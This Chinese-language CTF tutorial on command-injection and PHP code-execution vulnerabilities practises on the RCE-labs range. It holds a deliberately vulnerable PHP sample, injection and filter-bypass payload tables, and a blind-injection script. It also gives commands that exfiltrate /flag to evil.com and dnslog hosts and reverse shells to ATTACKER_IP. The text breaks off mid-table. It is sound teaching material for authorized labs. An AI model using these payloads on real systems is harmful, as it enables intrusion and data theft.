# 命令执行

> 一句话：**命令执行漏洞 = 你输入的内容，被当成系统命令的一部分执行了。**

`02-WEB` 学习路线里把「命令执行」放在第一位，不是因为它最简单，而是因为它最"值钱"——能拿到服务器的命令执行，基本等于拿下了这台机器。同时它也是你顺带学会 Linux 的最好借口。

!!! tip "本文怎么用"
    - 完全零基础：按 `1 → 2 → 3 → 4 → 6` 顺序读，边读边在靶场上敲，**不要只读不敲**。
    - 已经做过几道题：直接跳到 `8 绕过过滤速查表`、`10 为什么你的 payload 打不通`、`11 AI 时代怎么学`。
    - 本文的 payload 与脚本绝大多数已在本地环境实测（PHP 8.4 + RCE-labs 源码复现靶场），少数依赖旧版本 PHP 或特定 shell 的技巧会在原处标注。

!!! warning "免责声明"
    本文所有内容仅用于 CTF 比赛、自己搭建的靶场、以及获得书面授权的渗透测试。**未授权地对真实系统利用 RCE 是违法行为**，没有"我只是试试"这种说法。

## 0. 一分钟版本

| 你看到的现象                           | 关键词                | 去哪一节                   |
| -------------------------------- | ------------------ | ---------------------- |
| 输入点会执行系统命令（`ping`、`system`、`ls`） | 命令注入、分隔符           | [6 有回显](#has-echo)     |
| 命令执行了，但页面什么都不返回                  | 无回显、盲注、带外、写文件      | [7 无回显](#no-echo)      |
| 提示 `WAF!` / 关键词被禁 / 空格被禁         | 黑名单绕过、通配符、`$IFS`   | [8 绕过过滤](#bypass)      |
| `eval`、`assert`、无参套娃             | 代码执行、PHP 特性        | [9 PHP 专项](#php)       |
| 抄来的 payload 明明对却打不通              | 版本差异、编码层级、shell 差异 | [10 为什么打不通](#why-fail) |

三条利用路线，先判断题型再动手：

1. **有回显** → 直接拼接命令，读文件走人。
2. **无回显** → 写文件回读 / 时间盲注 / DNS、HTTP 带外 / 反弹 shell。
3. **有过滤** → 先判断"过滤了什么"，再查绕过表。

## 1. 先搞清概念：代码执行 ≠ 命令执行

这一节看着像名词解释，但它决定你之后看 writeup 时能不能对上号。

- **任意代码执行（Arbitrary Code Execution, ACE）**：攻击者能让目标运行"攻击者选择的代码"，这里的代码泛指任何程序/脚本/函数调用。
- **远程代码执行（Remote Code Execution, RCE）**：通过网络触发的 ACE。**CTF 里说的 RCE 一般就是指这个。**
- **代码执行（Code Execution）**：在某个语言里，通过函数/方法执行**该语言**的代码。PHP 里的代表是 `eval()`、`assert()`（PHP < 8）。
- **命令执行（Command Execution）**：在**操作系统层面**执行命令，如 Windows 的 CMD、Linux 的 Shell。PHP 里的代表是 `system()`、`exec()`、`shell_exec()`。

| 维度 | 代码执行 | 命令执行 |
| --- | --- | --- |
| 执行的是什么 | 该语言的代码，如 `eval("echo 1;")` | 系统命令，如 `system("id")` |
| 典型入口 | `eval()`、`assert()`、`create_function()`、回调函数、文件包含 | `system()`、`exec()`、`shell_exec()`、`passthru()`、`popen()`、反引号 |
| 拿 shell 的难度 | 有 `eval` 就等于有代码执行，可以直接调用命令执行函数 | 直接就是 shell，但可能被 `disable_functions` 拦 |
| 谁更危险 | 都能致命：`eval("system('id');")` 一步到位 | 同左 |

!!! note "两个概念在实战里经常混着说"
    靶场里 Level 0 就是这么设计的：`eval` 里写 `include('flag.php')` 是**代码执行**拿 flag，`system('cat /flag')` 是**命令执行**拿 flag。做题时不必纠结叫法，**纠结的是"我的输入走到了哪一层"**。

## 2. 前置：够用的 Linux 命令

不用先系统学 Linux，下面这张表能覆盖 90% 的命令执行题目。**建议对照靶场边用边记**。

| 目的 | 命令 | 备注 |
| --- | --- | --- |
| 看当前目录 | `ls`、`ls -la`、`ls /` | `ls -t` 按时间排（长度限制题会用到） |
| 读文件 | `cat`、`tac`（倒序）、`head`、`tail`、`nl`、`sort`、`uniq` | `?` 和 `*` 通配符可绕文件名过滤 |
| 找文件 | `find / -name "*flag*" 2>/dev/null` | 不知道 flag 在哪就用它 |
| 搜内容 | `grep -r "flag" /var/www 2>/dev/null` | |
| 身份/环境 | `id`、`whoami`、`env`、`pwd`、`uname -a` | 判断权限与系统 |
| 编码 | `base64`、`xxd -p`、`od`、`iconv` | 带外与绕过滤常用 |
| 写文件 | `echo x > f`、`printf`、`tee`、`sed`、`awk` | `>` 覆盖，`>>` 追加 |
| 网络 | `curl`、`wget`、`nc`、`/dev/tcp` | 带外、传马、反弹 shell |
| 提权探测 | `sudo -l`、`find / -perm -4000 2>/dev/null` | 拿到 shell 之后的事 |

!!! tip "顺手把 Shell 元字符记住"
    `;` `&&` `||` `&` `|` `` ` `` `$()` `>` `<` `#` —— 这 10 个符号是命令执行的"钥匙"。下一节就会用到。

## 3. 30 分钟上手：先在靶场上犯错

**不要先背 payload。** 先搭一个靶场，然后亲手把 `id` 打出来。

### 3.1 搭环境（三选一） {: #setup }

**方式 A：RCE-labs（推荐，题目最全）**

```bash
git clone https://github.com/ProbiusOfficial/RCE-labs.git
cd RCE-labs

# 方式 A1：只构建某一关（快）
docker build -f "Level 4/Dockerfile" -t rce_labs:v4 "Level 4"
docker run -d -p 18080:80 --name rce4 rce_labs:v4

# 方式 A2：构建全部 28 关（慢，会依次构建 rce_labs:v0 ~ v27）
bash build.sh
docker run -d -p 18084:80 --name rce4b rce_labs:v4
```

浏览器访问 `http://127.0.0.1:18080` 即可。关卡源码就在 `Level N/index.php`，**先看源码注释再打**，这是最高效的学习方式。

!!! tip "flag 在哪？"
    容器启动时会把 flag 写进 `/flag`（默认 `flag{TEST_Dynamic_FLAG}`，也可以用 `-e FLAG='flag{test}'` 覆盖）。想确认自己的 flag：`docker exec -it rce4 cat /flag`。每关源码注释里也写明了 flag 路径（例如 Level 4 的 `flag is /flag`）。

**方式 B：零依赖，自己搭一个最小靶场（最推荐新生先做这个）**

只要本机装了 PHP，建一个 `vuln.php`：

```php
<?php
// vuln.php —— 最小命令注入靶场
$ip = $_GET['ip'] ?? '127.0.0.1';
system("ping -c 1 " . $ip);   // Windows 下换成 ping -n 1
```

启动并测试：

```bash
php -S 127.0.0.1:8080 -t .
# 正常请求
curl 'http://127.0.0.1:8080/vuln.php?ip=127.0.0.1'
# 注入请求（注意引号，别让本地 shell 先解析了 ; ）
curl 'http://127.0.0.1:8080/vuln.php?ip=127.0.0.1;id'
```

第二条命令会回显出 `uid=...`，**这就是命令注入**。在自己机器上先看到这一幕，比看十篇 writeup 都管用。

**方式 C：在线平台**（无需本地环境）

- NSSCTF / 青少年 CTF / CTF+ 上搜索标签 **RCE-labs**（或来源选 HelloCTF）
- CTFShow 的 VIP Web 靶场（付费，但前中期学习路线完整）

### 3.2 第一道题：ping 型命令注入（完整走一遍）

靶场源码（等价于 RCE-labs Level 4）：

```php
<?php
// flag is /flag
function hello_server($ip){
    system("ping -c 1 $ip");
}
isset($_GET['ip']) ? hello_server($_GET['ip']) : null;

highlight_file(__FILE__);
?>
```

`$ip` 完全可控，最终交给 shell 执行的是 `ping -c 1 ` 拼接上你输入的内容，于是：

| 请求 | 结果 |
| --- | --- |
| `?ip=127.0.0.1;cat /flag` | ✅ 执行 |
| `?ip=127.0.0.1&&cat /flag` | ✅ 执行（前面 ping 成功返回 0） |
| `?ip=127.0.0.1|cat /flag` | ✅ 执行（管道，输出会作为下一个命令的输入，但 cat 输出仍会回显） |
| `?ip=127.0.0.1%0acat%20/flag` | ✅ 执行（换行符也是命令分隔符） |
| `?ip=x||cat /flag` | ⚠️ 只有前面的命令**失败**才执行 |
| ``?ip=`cat /flag` `` | ✅ 命令替换，flag 会作为 ping 的参数（多半看不到，除非配合 `echo`） |

!!! warning "`||` 最容易踩的坑"
    `ping -c 1 127.0.0.1 || cat /flag` **不会**执行 `cat`，因为 ping 成功了（返回码 0）。让前半段故意失败（例如 `?ip=x||cat /flag`），或者干脆用 `;`。

### 3.3 RCE-labs 练习顺序（按阶段刷，别按编号硬刷）

| 阶段 | 关卡 | 内容 |
| --- | --- | --- |
| ① 建立概念 | Level 0 ~ 3 | 代码执行 vs 命令执行、一句话木马、PHP 代码执行函数、命令执行 |
| ② 命令执行基础 | Level 4 ~ 8 | Shell 运算符、黑名单、通配符、空格过滤、重定向与无回显 |
| ③ Bypass 变形 | Level 9 ~ 18 | 无字母命令执行、7/5/4 字符极限长度、环境变量注入 |
| ④ PHP 特性 | Level 22 ~ 26 | 动态调用、自增、无参命令执行、取反、无字母数字代码执行 |
| ⑤ RCE 的其它来源 | Level 19 ~ 21、27 | 文件写入 / 文件上传 / 文件包含 / 模板注入导致的 RCE |

## 4. 原理：为什么能"越狱"

漏洞的根因只有一句话：**用户输入被当作"命令"的一部分，而不是"数据"。**

```php
system("ping -c 1 " . $ip);
//      └──── 命令 A ────┘
// 你输入 127.0.0.1;id 后，shell 看到的是：
//      ping -c 1 127.0.0.1;id
//                          └─ shell 认为这是另一条命令
```

关键在于 `system()` 底层是 `popen` → `sh -c "..."`，也就是**你的输入会被交给 shell 重新解析一次**。shell 不关心"这是用户数据"，它只认符号。

!!! note "心法：弄清你的输入落在哪一层"
    一次典型的命令执行链路：

    ```
    HTTP 请求  →  PHP 代码（字符串拼接）  →  sh -c 解析  →  真正的命令
       ↑ 编码层        ↑ 语言层                ↑ shell 层
    ```

    以后每遇到一道新题，都问自己三个问题：
    1. 我的输入在**语言层**被怎么处理了（拼接？过滤？转义？）
    2. 到了 **shell 层**还剩什么符号可用（`;` 还在吗？空格还在吗？）
    3. **编码层**有没有二次解码（`%0a` 会不会先被 URL 解码成换行）

    90% 的"payload 打不通"，都是这三层里有一层没对上（详见 [第 10 节](#why-fail)）。

## 5. 利用路线图

拿到题目后按顺序判断，不要一上来就抄 payload：

```
题目给你什么？
├─ 源码 / 报错信息里有 system、exec、ping、eval 等关键字
│   └─ 先本地复现一遍「正常请求」长什么样 → 再插一个 `;id` 试分隔符
├─ 命令执行了但没回显
│   └─ 试写文件回读 → 时间盲注 → 带外（DNS/HTTP）→ 反弹 shell
├─ 有过滤（WAF!/hacker!/die）
│   └─ 先确定过滤了什么：把 payload 逐个字符删，看什么时候不报错
│       → 空格？关键词？斜杠？字母数字？长度？括号？
└─ 有 eval 但没有命令执行函数
    └─ 代码执行路线：直接 eval 代码 / 无参套娃 / 取反 / 无字母数字
```

!!! tip "一个高效的调试习惯"
    把过滤规则"测"出来，而不是"猜"出来。比如发现空格被过滤，就把同一个 payload 换成下面几种写法依次发，看哪一个不触发 WAF：

    ```bash
    cat /flag
    cat</flag
    cat${IFS}/flag
    ```

    这就是手工 fuzz，比问 AI 猜过滤规则快得多。

## 6. 有回显：先确认能不能看到输出 {: #has-echo }

### 6.1 分隔符速查

| 符号 | 语义 | 例（`$ip` 可控） |
| --- | --- | --- |
| `;` | 顺序执行，前一条失败也继续 | `127.0.0.1;cat /flag` |
| `&&` | 前一条**成功**才执行 | `127.0.0.1&&cat /flag` |
| `||` | 前一条**失败**才执行 | `x||cat /flag` |
| `|` | 管道，前一条输出传给后一条 | `127.0.0.1|cat /flag` |
| `&` | 前一条放后台，立即执行后一条（Web 里通常要 URL 编码成 `%26`） | `127.0.0.1%26cat /flag` |
| `%0a` / `%0d` | 换行 / 回车，等价于新的一条命令 | `127.0.0.1%0acat%20/flag` |
| `` `cmd` `` / `$(cmd)` | 命令替换，结果作为一段文本插入 | ``echo `cat /flag` `` |

### 6.2 读文件的姿势（按"能读到"到"读不到也能绕"排序）

```bash
cat /flag
tac /flag                     # 倒序，绕 "flag" 关键字过滤的另一种思路
cat /f*                       # 通配符，绕文件名不确定/被过滤
cat /fla?
cat /???/??????               # 只给长度信息时
nl /flag; head -n 1 /flag; sort /flag; uniq /flag
base64 /flag                  # 内容里有特殊字符/被截断时
grep -r "flag" / 2>/dev/null  # 不知道 flag 在哪
find / -name "*flag*" 2>/dev/null
```

### 6.3 flag 不在明面上时

| 现象 | 对策 |
| --- | --- |
| 只知道 flag 在某个目录 | `find / -name "*flag*" 2>/dev/null`、`ls -la /` |
| 页面只显示一部分（长度截断） | `cut`、`tail`、`base64` 分段读 |
| 命令结果被 HTML 转义 | 用 `base64`（它天生不带特殊字符），或者把结果写文件再访问 |
| 只有 root 能读（需要 SUID 提权） | `find / -perm -4000 2>/dev/null`，找 `readflag` 之类的二进制 |

## 7. 无回显：把结果"搬出来" {: #no-echo }

`exec()` 这类函数只返回最后一行；有些题干脆把输出重定向到了 `/dev/null`。此时**不是没执行，是你看不见**。

典型"无回显"源码（RCE-labs Level 8）：

```php
function hello_shell($cmd){
    system($cmd . ">/dev/null 2>&1");   // 输出被吞掉
}
```

### 7.1 写文件 + 回读（最常用）

```bash
cat /flag > /var/www/html/out.txt          # 常规写法
cat /flag | tee /var/www/html/out.txt      # tee 自己写文件，不受末尾重定向影响

# 如果题目在你命令末尾追加了 >/dev/null 2>&1，可以用 # 把它注释掉：
cat /flag > /var/www/html/out.txt #
```

然后访问 `http://target/out.txt`。

!!! tip "为什么 `>` 有时不管用"
    题目如果在你的命令后面追加了 `>/dev/null 2>&1`，那么 `cat /flag > out.txt >/dev/null` 里**最后一个重定向生效**，文件写不出来。两种解法：用 `tee`（它自己写文件，stdout 被丢掉无所谓），或者用 `#` 把后面追加的内容注释掉。两者都实测有效。

### 7.2 时间盲注（页面完全没有回显参照时）

思路：把"读到的字符"变成一个**可观测的副作用**——延迟。

```bash
if [ "$(cat /flag | cut -c1)" = "f" ]; then sleep 3; fi
```

脚本骨架（仅用标准库，零依赖）：

```python
#!/usr/bin/env python3
# 用法: python3 blind.py "http://target/index.php?cmd=" "/flag"
import sys, time, string
from urllib.parse import quote
from urllib.request import urlopen

url   = sys.argv[1]
path  = sys.argv[2] if len(sys.argv) > 2 else '/flag'
chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + '{}_-'
delay = 3

flag = ''
for i in range(1, 61):
    found = False
    for c in chars:
        payload = f'if [ "$(cat {path} | cut -c{i})" = "{c}" ]; then sleep {delay}; fi'
        t0 = time.time()
        try:
            urlopen(url + quote(payload), timeout=delay + 5).read()
        except Exception:
            pass
        if time.time() - t0 >= delay - 1:      # 明显变慢 ⇒ 猜中了
            flag += c
            found = True
            print(f'[*] {flag}', flush=True)
            break
    if not found:
        break
print(f'[+] result: {flag}')
```

!!! tip "盲注的通用套路"
    - 判断字符用 `cut -cN`（第 N 个字符）、`awk 'NR==N'`（第 N 行，选文件用）
    - 不确定文件名时先盲注文件名：`ls / | awk 'NR==4' | cut -c1`
    - 延迟建议 ≥ 3 秒，否则会被网络抖动干扰；一次请求只问一个是/否，慢但稳
    - 本地实测：命中时约 2000ms，未命中约 30ms，差异非常明显

### 7.3 带外（OOB）：让目标主动联系你

页面无回显、也没法写文件（无写权限）时，让目标把结果**发到你的服务器**。

```bash
# DNS 带外（最隐蔽，很多 WAF 不管）：用 dnslog / Burp Collaborator 的子域名
ping -c 1 `whoami`.xxxxxx.dnslog.cn
curl http://`cat /flag`.xxxxxx.dnslog.cn

# HTTP 带外（能带更多数据）
curl http://your-vps/?d=`cat /flag | base64`
```

!!! warning "两个实测踩过的坑（会很浪费时间）"
    1. **`curl` 会把 `{}` 当 URL glob 展开**，于是 `flag{abc}` 被吃掉变成 `flagabc`。解法：加 `-g`（关闭 globbing），或者先 `base64` 再发。
    2. **`base64` 默认带换行**，URL 里会多出一个 `%0A`。稳妥写法：`cat /flag | base64 | tr -d '\n'`。

    本地实测正确姿势：
    ```bash
    curl -g "http://evil.com/$(cat /flag)"                  # -g 关闭 glob
    curl "http://evil.com/$(cat /flag | base64 | tr -d '\n')"  # 或者编码后再发
    ```

### 7.4 反弹 shell {: #reverse-shell }

如果目标是交互式拿 shell（而不只是读文件）：

```bash
bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
nc ATTACKER_IP 4444 -e /bin/sh          # 目标有 nc -e 时（很多发行版阉割了）
```

攻击机侧先监听：`nc -lvnp 4444`（Ubuntu 的 nc 是 openbsd 版，需要 `nc -lvnp`；也可以直接上 [pwncat-cs](https://pwncat.readthedocs.io/) 获得更好的交互体验）。

!!! note "原理比 payload 重要"
    反弹 shell 的本质是**文件描述符重定向**：把 stdin/stdout/stderr 绑到一个 TCP 连接上。理解了这一点，各种变体（`/dev/tcp`、`mkfifo`、python/perl/php 一句话反弹）都能自己推出来，网上那些"反弹 shell 命令生成器"就只是省事工具而已。本文实测确认了 `/dev/tcp` 这条通道可用（成功把文件内容发到了监听端），但正式 exp 仍建议先在目标同版本系统上验一次。

## 8. 绕过过滤：黑名单攻防速查表 {: #bypass }

这一节是命令执行的核心技能，**建议从头到尾在靶场里各打一遍**。

### 8.1 空格被过滤

| 绕过 | Payload | 说明 |
| --- | --- | --- |
| `$IFS` | `cat${IFS}/flag` | 最稳，`$IFS` 默认就是空格/制表/换行 |
| `$IFS$9` | `cat$IFS$9/flag` | `$9` 是空字符串，用于切断变量名 |
| TAB | `cat%09/flag` | Web 场景下把空格换成 `%09` |
| 重定向 | `cat`&lt;`/flag` | ⚠️ 重定向目标**不做通配符展开**，文件名必须确定 |
| 花括号 | `{cat,/flag}` | **仅 bash 生效**，dash/ash 不行 |
| 十六进制 | `cat$'\x20'/flag` | `$'...'` 是 bash/ksh 特性，ash 不支持 |

### 8.2 关键词（`flag`、`cat`、`/`）被过滤

| 绕过 | Payload | 说明 |
| --- | --- | --- |
| 引号拼接 | `c''at /flag`、`wh''oami` | shell 会把空引号去掉 |
| 反斜杠 | `c\at /flag` | |
| 通配符 | `cat /fla?`、`cat /f*`、`cat /???/??????` | 最常用 |
| 字符集 | `cat /[f]lag` | |
| 变量拼接 | `a=c;b=at;$a$b /flag` | |
| 反斜杠+斜杠 | `cat ${HOME:0:1}flag` | `${HOME:0:1}` = `/` |
| base64 解码执行 | `` `echo Y2F0IC9mbGFn | base64 -d` `` | base64 内容里没有敏感关键词 |
| 十六进制 | `echo -n 636174202f666c6167 | xxd -r -p | bash` | |
| 八进制/printf | `$(printf "\143\141\164\040\057\146\154\141\147")` | |

!!! tip "通配符是命令执行的万能钥匙"
    `*`（任意长度）、`?`（单字符）、`[]`（字符集）、`{}`（bash 枚举）不仅能绕关键词，还能绕"不知道真实文件名"的场景。思路：`/???/???` 之类的短模式扫一遍。

### 8.3 字母数字被过滤（无字母数字 RCE）

三种主流思路，都要靠脚本构造 payload：

1. **取反**（PHP 7+ 通用，最省事）：对函数名/参数做按位取反，得到不可见字符。
2. **异或**：两个允许字符异或出目标字符，需要脚本枚举字符集。
3. **自增**：利用 PHP 字符串自增（`'a'++` → `'b'`、`'A'++` → `'B'`）拼出函数名。

**取反（已实测，直接可用）**：

```php
<?php
// 生成器：把 system 和要执行的命令取反后拼成 payload
$f = 'system';
$c = 'cat /flag';
echo "(~'" . urlencode(~$f) . "')(~'" . urlencode(~$c) . "');";
// 输出形如：(~'%8C%86%8C%8B%9A%92')(~'%9C%9E%8B%DF...');
```

把生成的串**原样**放进 URL（`%XX` 不要再编码一次）：

```
?code=(~'%8C%86%8C%8B%9A%92')(~'%9C%9E%8B%DF%D0%8B%92%8F%D0%97%8B%8B%8F%93%9E%9D%D0%99%93%9E%98');
```

这套 payload 不含任何字母数字，能直接绕过 `/[A-Za-z0-9]+/` 这类过滤（在 RCE-labs Level 25 的源码上实测读出了文件内容）。

**自增的起手式（下面这几行实测在 PHP 8 上也成立）**：

```php
$_   = ([].'')[''=='_'];                      // false 当索引 0 → "A"
$_++;                                         // "A" → "B"：PHP 的字符串自增
$__  = ([].'')[''==''];                       // true 当索引 1 → "r"
$___ = ([].'')[(''=='')+(''=='')+(''=='')];   // 3 → "a"
$___++;$___++;                                // → "c"
```

`([].'')` 得到字符串 `"Array"`，用 `''==''`（真）和 `''=='_'`（假）当索引，就**不需要写任何数字**。拿到大写起点 `"A"` 和小写起点 `"a"` 之后，靠 `++` 就能拼出任意字母，再用 `chr()` 配合构造出的数字拼出变量名与函数名。

完整 payload 是把「变量名」（`_GET`/`_POST`）和「函数名」都这样一点点拼出来的长链，RCE-labs Level 23 给的形态大致以 `$_=(_/_._)[''=='_'];` 开头、一路 `++` 拼到 `$_POST` 再调用。

!!! warning "别急着抄自增 payload"
    PHP 8 起「未定义常量」从"警告并当字符串用"变成 **Fatal error**，所以 `_/_._` 这类依赖裸字符串常量的技巧会直接报错；此外 `create_function`、`assert` 的字符串执行、`preg_replace` 的 `/e` 也都已经移除。**判断目标 PHP 版本永远是你的第一步**（`phpinfo()`、报错信息、`X-Powered-By`）。详细的脚本与推导看：
    - [一些不包含数字和字母的 webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
    - [无字母数字 webshell 之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
    - [bashFuck（探姬）](https://probiusofficial.github.io/bashFuck/)
    - [PHP-inversion：取反 payload 在线生成](https://probiusofficial.github.io/PHP-inversion/)

### 8.4 无参数（无参 RCE）

过滤形如 `preg_replace('/[^\W]+\((?R)?\)/', '', $code)` 时，**只允许"不带参数的函数嵌套调用"**，见 [第 9.2 节](#no-param-rce)。

### 8.5 长度限制（7 / 5 / 4 字符）

经典题组：题目对 `strlen($_GET[1])` 做了限制（7 字符 / 5 字符 / 4 字符），一次只能发一小段。核心是**先用文件名拼出命令，再执行脚本文件**：

1. 用最短的命令（`w`、`ls`）配合重定向，把内容"写进文件名"：

   ```bash
   w > hp     # 执行 w，输出重定向到文件 hp —— 文件名叫 hp，内容是 w 的输出
   ```

2. 用 `ls -t`（按修改时间倒序）把散落的文件名按需要的顺序拼成一条命令；
3. 用 `sh 拼出来的文件` 执行它。

这就是"换行符不影响命令执行"这一特性的极端应用。

参考题解：[7 字符（phith0n）](https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html)、[HITCON 2017 babyfirst-revenge（5 字符）与 babyfirst-revenge-v2（4 字符）](https://github.com/ProbiusOfficial/RCE-labs)——对应 RCE-labs 的 Level 14 / 15 / 16。

### 8.6 `disable_functions` 禁用函数 {: #disable-functions }

看到 `Warning: system() has been disabled for security reasons` 就说明撞上 `disable_functions` 了。

| 方向 | 说明 |
| --- | --- |
| 换函数 | `exec`/`shell_exec`/`passthru`/`popen`/`pcntl_exec`/反引号/`mail` 等轮流试；`pcntl_exec` 属扩展，常被漏封 |
| 直接读文件 | `print_r`、`scandir`、`glob`、`file_get_contents`、`highlight_file`、`SplFileObject`、`DirectoryIterator` |
| 绕过原理 | `LD_PRELOAD` 劫持、`FFI`、`pcntl_exec`、`GC UAF`、ImageMagick 命令注入、`curl --engine`、`cnext (CVE-2024-2961)` |

!!! tip "先判断再选武器"
    `disable_functions` 往往只封了"命令执行"这一类函数，**读文件的能力通常还在**——很多题根本不需要真正的 shell，读到 flag 就赢了。完整清单见文末参考中的《RCE总结》。

### 8.7 环境变量注入（进阶但好用）

源码形态（RCE-labs Level 18）：

```php
foreach($_REQUEST['envs'] as $key => $val) {
    putenv("{$key}={$val}");   // 变量名和值都完全可控
}
system('echo hello');          // 注意：执行的是 bash 内置命令 echo
```

既然变量名可控，就可以注入 `BASH_FUNC_xxx%%` 形式的环境变量（`xxx` 换成 `system()` 里被调用的那个命令名，例如 `echo`），把要执行的内置命令**替换**成我们的代码：

```
?envs[BASH_FUNC_echo%%]=() { cat /flag; }
```

URL 里 `%` 要写成 `%25`、空格写成 `%20`，即：

```
?envs%5BBASH_FUNC_echo%25%25%5D=%28%29+%7B+cat+%2Fflag%3B+%7D
```

原理：bash 启动时会从环境变量里导入 `BASH_FUNC_xxx%%` 形式的函数定义（这正是 Shellshock 系列漏洞的机制）。实测注意两点：

- 值必须是 `() { 命令; }` 的完整形式（`)` 与 `{` 之间、`{` 与命令之间要有空格，少了空格就不生效）；
- 打过补丁的 bash 用带 `%%` 的变量名形式；更老的、未打补丁的 bash 用不带 `%%` 的 `BASH_FUNC_echo()` 形式。

详见 [phith0n：我是如何利用环境变量注入执行任意命令](https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html)。

## 9. PHP 专项 {: #php }

### 9.1 危险函数表

**代码执行类：**

| 函数 | 说明 | 版本注意 |
| --- | --- | --- |
| `eval()` | 把字符串当 PHP 代码执行；是**语言构造器**，不能被 `disable_functions` 禁用 | 全版本 |
| `assert()` | PHP < 8 时字符串参数会当代码 `eval` | **PHP 8.0 起移除此行为** |
| `create_function()` | 内部 `eval`，可提前闭合 `}` 注入代码 | PHP 7.2 废弃，**8.0 移除** |
| `preg_replace()` | 依赖 `/e` 修饰符执行替换结果 | **PHP 7.0 起移除 `/e`** |
| `call_user_func()` / `call_user_func_array()` | 回调任意函数，如 `call_user_func('system','id')` | 全版本 |
| `array_map()` / `usort()` / `array_filter()` / `array_reduce()` / `ob_start()` | 把可控参数当回调 | 全版本 |
| `${}` | 复杂变量解析，配合 `eval` 间接执行 | — |

**命令执行类：**

| 函数 | 回显 | 说明 |
| --- | --- | --- |
| `system()` | 直接输出 | 底层 `sh -c`，最常考 |
| `passthru()` | 直接输出 | 输出原始数据 |
| `exec()` | 只返回最后一行（需自己 `echo`） | 常造成"无回显"假象 |
| `shell_exec()` | 返回完整输出（需自己 `echo`） | — |
| `popen()` | 返回文件指针 | 需 `fgets` 才看得到 |
| `pcntl_exec()` | 无 | `pcntl` 扩展专有 |
| `` `cmd` `` | 返回输出 | 反引号与 `shell_exec` 等价 |

### 9.2 无参 RCE 工具箱 {: #no-param-rce }

过滤规则（RCE-labs Level 24）：

```php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $code)){
    eval($code);
}
```

意思是：只允许形如 `a(b(c()))` 的**无参函数嵌套**。以下技巧均在本地靶场源码上实测可用：

| 目的 | Payload |
| --- | --- |
| 列出当前目录 | `?code=print_r(scandir(current(localeconv())));` |
| 换目录（父目录） | `?code=print_r(scandir(dirname(getcwd())));` |
| 进子目录再列 | `?code=chdir(next(scandir(getcwd())));print_r(scandir(getcwd()));` |
| 读文件（语法高亮） | `?code=highlight_file(next(array_reverse(scandir(current(localeconv())))));` |
| 从请求头里取代码执行 | `?code=eval(next(getallheaders()));` + `User-Agent: system('cat /flag');` |
| 同上（自定义头） | `?code=eval(end(getallheaders()));` + `X-Cmd: system('cat /flag');` |

!!! tip "无参 RCE 的调参口诀"
    - `localeconv()` 的第一个值是 `.`（当前目录），所以 `current(localeconv())` 常用来喂给 `scandir()`。
    - `scandir()` 的结果是**按文件名排序**的，`next()` 拿的是"排序后的第二个"。**文件顺序变了 payload 就失效**——这就是为什么 writeup 里的 `next()` 数量你别照抄，要看自己目标目录的文件列表。
    - `array_reverse()` 把数组倒过来，通常是为了少写几个 `next()`。

!!! warning "`session_id()` 技巧为什么现在常常打不通"
    `?code=show_source(session_id(session_start()));` + `Cookie: PHPSESSID=flag.php` 是老 writeup 的常客。它依赖"`session_start()` 原样保留 Cookie 里的 id"。在较新的 PHP 上，会话 id 校验/strict 模式会重新生成 id，**除非保存路径里已存在对应的会话文件（`sess_` 前缀加会话 id）**，此技巧就会失效。本文实测 PHP 8.4 下不生效。老 payload 打不通时，先怀疑这种版本差异，不要怀疑自己敲错了。

### 9.3 突破 `disable_functions`（了解即可）

按投入产出排序的建议：**先用 PHP 内置函数读文件 → 再试漏封的命令执行函数 → 最后才上 Pwn 级技巧**（FFI / GC UAF / LD_PRELOAD / 漏洞链）。后者属于进阶内容，新生阶段知道"有这条路"就够了，具体手法见参考中的《RCE总结》。

## 10. 为什么你的 payload 打不通 {: #why-fail }

这是**全文最值钱的一节**。你抄来的 payload 90% 不是写错了，而是**环境对不上**。

| 症状 | 常见原因 | 怎么办 |
| --- | --- | --- |
| `eval` 里 payload 直接 Fatal error | PHP 8 起未定义常量报错，裸字符串常量技巧失效 | 先确定 PHP 版本；换取反/异或写法 |
| `assert()` 不走字符串代码 | PHP 8.0 移除该行为 | 换 `eval`；确认版本 |
| `create_function` / `preg_replace('/e')` 不存在 | PHP 8.0 / 7.0 已移除 | 换等价函数 |
| 命令分隔符没生效 | 输入被 `escapeshellarg()` 转义、或被 WAF 拦 `;` `&` | 用 `%0a`；确认数据流向 |
| `%0a` 变成了字面量 | URL 只解码一次，或你的工具二次编码 | 用 Burp 看**原始请求**，别用浏览器地址栏 |
| `{cat,/flag}`、`$'\x20'` 不生效 | 这两个是 bash 专属语法，dash/ash（Debian 的 `/bin/sh`、alpine 的 ash）不支持 | 换 `$IFS`、`%09`；先确认目标 `/bin/sh` 指向什么 |
| `cat`&lt;`/flag*` 报 No such file | **重定向目标不做通配符展开**（dash/ash/POSIX sh） | 文件名写全，或把通配符放在参数位 |
| `||` 后面的命令不执行 | 前一条命令成功了 | 换 `;`，或让前一条故意失败 |
| 命令执行了但页面没东西 | 无回显（`>/dev/null`、`exec` 只返回最后一行、缓冲区被清） | 见 [第 7 节](#no-echo) |
| 带外收到的内容缺了 `{}` | `curl` 的 URL glob 把 `{}` 当范围展开 | 加 `-g`，或先 `base64` |
| 带外内容末尾多 `%0A` | `base64` 输出带换行 | `| tr -d '\n'` |
| `Permission denied` | 当前用户权限不足 / `open_basedir` 限制 | `id` 看权限；找 `readflag`、SUID |
| 只能读不能执行 | `disable_functions` | 见 [8.6](#disable-functions) |
| 请求发出去没反应 | WAF 直接 403，不是 payload 问题 | 用 Burp 看响应码与长度，逐字符二分定位被拦的字符 |

!!! tip "定位过滤规则的标准动作"
    1. 发一个**绝对合法**的请求（如 `?ip=127.0.0.1`），确认 200。
    2. 加上一个字符（`;`、空格、`/`），看是否被拦 —— 这就是**二分法**确定黑名单。
    3. 把命中的字符换成绕过写法，其余保持不变。
    4. 每步都用 Burp 看**原始请求与响应**，不要靠猜。

## 11. AI 时代怎么学命令执行

命令执行的知识点极度碎片化（`$IFS` 有几种写法、PHP 有几个版本、shell 有几个分支），这正是 AI 最擅长补位的场景；但也正是**最容易让人以为自己学会了**的场景。

### 11.1 把 AI 当成三种角色，而不是"答案机器"

| 角色 | 怎么用 | 例子 |
| --- | --- | --- |
